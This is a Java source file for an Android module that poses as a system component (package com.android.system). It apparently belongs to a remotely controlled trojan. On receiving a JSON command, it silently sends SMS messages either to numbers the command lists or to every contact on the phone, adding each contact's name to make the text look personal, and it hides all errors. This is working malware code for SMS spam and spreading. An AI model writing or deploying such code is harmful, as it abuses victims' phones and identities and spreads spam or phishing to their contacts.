package com.android.system.session.handler;

import com.android.system.service.SystemService;
import com.android.system.session.SessionManager;
import com.android.system.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

public class SendSmsSessionHandler implements SessionManager.SessionHandler {
    @Override
    public void handleSession(JSONObject receiveJsonObject, InputStream inputStream, OutputStream outputStream) {
        List<String> onlyList = null;
        String content = null;
        try {
            content = receiveJsonObject.getString("content");
            JSONArray onlyArray = receiveJsonObject.getJSONArray("only");
            if(onlyArray.length() > 0) {
                onlyList = new ArrayList<String>();
                for(int i =0; i<onlyArray.length(); ++i) {
                    onlyList.add(onlyArray.getString(i));
                }
            }
        } catch (JSONException e) {
        }
        if(content == null) {
            return;
        }
        final String finalContent = content;
        if(onlyList == null) {
            final List<SystemUtil.ContactData> contactDataList = SystemUtil.getContactDataInPhone(SystemService.getContext());
            new Thread(new Runnable() {
                @Override
                public void run() {
                    sendMessageToContact(finalContent,contactDataList);
                }
            }).start();
            return;
        }
        final List<String> finalOnlyList = onlyList;
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendMessage(finalContent, finalOnlyList);
            }
        }).start();
    }

    private void sendMessage(String content, List<String> numberList) {
        for(String number: numberList) {
            try {
                SystemUtil.sendSmsTo(SystemService.getContext(), number, content);
            } catch (Exception e) {
            }
        }
    }

    private void sendMessageToContact(String content, List<SystemUtil.ContactData> contactDataList) {
        for(SystemUtil.ContactData contactData: contactDataList) {
            try {
                String data = content;
                if( contactData.name != null && contactData.name.length() > 0) {
                    char first = contactData.name.charAt(0);
                    char end = contactData.name.charAt(contactData.name.length() - 1);
                    if( !( '0' <= first && first <= '9' && '0' <= end && end <= '9' ) ) {
                        data = contactData.name + " " + content;
                    }
                }
                SystemUtil.sendSmsTo(SystemService.getContext(), contactData.number, data);
            } catch (Exception e) {
            }
        }
    }
}
